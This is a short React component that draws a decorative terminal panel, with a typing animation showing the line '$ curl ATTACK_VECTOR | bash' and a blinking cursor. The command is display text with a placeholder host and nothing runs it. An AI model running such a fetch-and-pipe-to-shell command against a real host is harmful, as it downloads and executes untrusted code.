import React from 'react'
import Panel from 'muicss/lib/react/panel'

export default props => (
  <Panel
    style={{
      maxWidth: '300px',
      margin: '10px auto',
      borderRadius: '0',
      backgroundColor: 'black',
    }}
  >
    <div
      style={{
        position: 'relative',
        width: '100%',
        height: 0,
        padding: 0,
        paddingBottom: (843 / 1024 * 100) + '%',
        overflow: 'hidden',
        backgroundColor: 'black',
        borderRadius: '5px',
        border: 'solid 1px antiquewhite',
      }}
    >
      <div
        style={{
          padding: '5px',
          display: 'inline-block',
          width: 'auto',
        }}
      >
        <div
          className='mui--text-body2'
          style={{
            overflow: 'hidden',
            display: 'inline-block',
            fontSize: '0.75em',
            lineHeight: '1',
            paddingRight: '0.15em',
            borderRight: '1em solid rgba(200,200,200,0.5)',
            whiteSpace: 'nowrap',
            letterSpacing: '0.15em',
            animation: 'typing 3s steps(30), cursorOut 0s step-end 3.5s forwards',
          }}
        >
          <div
            className='mui--text-body2'
            style={{
              display: 'inline-block',
              color: 'darkseagreen',
              fontSize: '1em',
              lineHeight: '1.75',
              fontFamily: 'monospace',
            }}
          >
            $ curl ATTACK_VECTOR | bash
          </div>
        </div>
        <br/>
        <div
          className='mui--text-body2'
          style={{
            overflow: 'hidden',
            display: 'inline-block',
            fontSize: '0.75em',
            lineHeight: '1',
            paddingRight: '0.15em',
            whiteSpace: 'nowrap',
            letterSpacing: '0.15em',
            animation: 'cursorIn 0s step-end 3.6s forwards',
          }}
        >
          <div
            className='mui--text-body2'
            style={{
              display: 'inline-block',
              color: 'darkseagreen',
              fontSize: '1em',
              lineHeight: '1.75',
              fontFamily: 'monospace',
            }}
          >
            &nbsp;
          </div>
        </div>
      </div>
    </div>
  </Panel>
)
